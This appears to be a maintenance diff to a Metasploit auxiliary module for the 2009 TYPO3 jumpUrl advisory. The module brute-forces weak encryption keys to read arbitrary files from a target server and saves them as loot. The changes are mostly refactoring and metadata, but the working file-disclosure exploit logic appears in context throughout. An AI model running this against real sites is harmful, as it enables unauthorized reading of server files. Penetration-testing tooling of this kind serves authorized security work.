@@ -23,7 +23,12 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'DisclosureDate' => 'Jan 20 2009',
       'Author' => [ 'Chris John Riley' ],
-      'License' => MSF_LICENSE
+      'License' => MSF_LICENSE,
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -78,13 +83,14 @@ class MetasploitModule < Msf::Auxiliary
     print_status("Trying to retrieve #{datastore['RFILE']}")
     print_status('Rotating through possible weak encryption keys')
 
+    success = false
     for i in (0..1000)
 
       final = enc_key(i)
 
-      locationData = Rex::Text.rand_text_numeric(1) + '::' + Rex::Text.rand_text_numeric(2)
+      location_data = Rex::Text.rand_text_numeric(1) + '::' + Rex::Text.rand_text_numeric(2)
       juarray = "a:3:{i:0;s:#{jumpurl_len}:\"#{jumpurl_enc}\""
-      juarray << ";i:1;s:#{locationData.length}:\"#{locationData}\""
+      juarray << ";i:1;s:#{location_data.length}:\"#{location_data}\""
       juarray << ";i:2;s:#{final.length}:\"#{final}\";}"
 
       juhash = Digest::MD5.hexdigest(juarray)
@@ -92,7 +98,7 @@ class MetasploitModule < Msf::Auxiliary
 
       uri_base_path = normalize_uri(uri, '/index.php')
 
-      file_uri = "#{uri_base_path}?jumpurl=#{jumpurl}&juSecure=1&locationData=#{locationData}&juHash=#{juhash}"
+      file_uri = "#{uri_base_path}?jumpurl=#{jumpurl}&juSecure=1&locationData=#{location_data}&juHash=#{juhash}"
       vprint_status("Checking Encryption Key [#{i}/1000]: #{final}")
 
       begin
@@ -104,7 +110,8 @@ class MetasploitModule < Msf::Auxiliary
             'Connection' => 'Close'
           }
         }, 25)
-      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
+        vprint_error(e.message)
       rescue ::Timeout::Error, ::Errno::EPIPE => e
         print_error(e.message)
       end
@@ -115,32 +122,31 @@ class MetasploitModule < Msf::Auxiliary
         when 'jumpurl Secure: "' + datastore['RFILE'] + '" was not a valid file!'
           print_error("File #{datastore['RFILE']} does not exist.")
           print_good("Discovered encryption key : #{final}")
-          return
-        when 'jumpurl Secure: locationData, ' + locationData + ', was not accessible.'
+          break
+        when 'jumpurl Secure: locationData, ' + location_data + ', was not accessible.'
           print_error("File #{datastore['RFILE']} is not accessible.")
           print_good("Discovered encryption key : #{final}")
-          return
+          break
         when 'jumpurl Secure: The requested file was not allowed to be accessed through jumpUrl (path or file not allowed)!'
           print_error("File #{datastore['RFILE']} is not allowed to be accessed through jumpUrl.")
           print_good("Discovered encryption key : #{final}")
-          return
+          break
         end
       when 'application/octet-stream'
+        success = true
         addr = Rex::Socket.getaddress(rhost) # Convert rhost to ip for DB
         print_good("Discovered encryption key : #{final}")
         print_good('Writing local file ' + File.basename(datastore['RFILE'].downcase) + ' to loot')
         store_loot('typo3_' + File.basename(datastore['RFILE'].downcase), 'text/xml', addr, file.body, 'typo3_' + File.basename(datastore['RFILE'].downcase), 'Typo3_sa_2009_001')
-        return
+        break
       else
         if datastore['ENC_KEY'] != ''
           print_error('Encryption Key specified is not correct')
-          return
-        else
-          # Try next encryption key
+          break
         end
       end
     end
 
-    print_error("#{rhost}:#{rport} [Typo3-SA-2009-001] Failed to retrieve file #{datastore['RFILE']}")
+    print_error("#{rhost}:#{rport} [Typo3-SA-2009-001] Failed to retrieve file #{datastore['RFILE']}") unless success
   end
 end
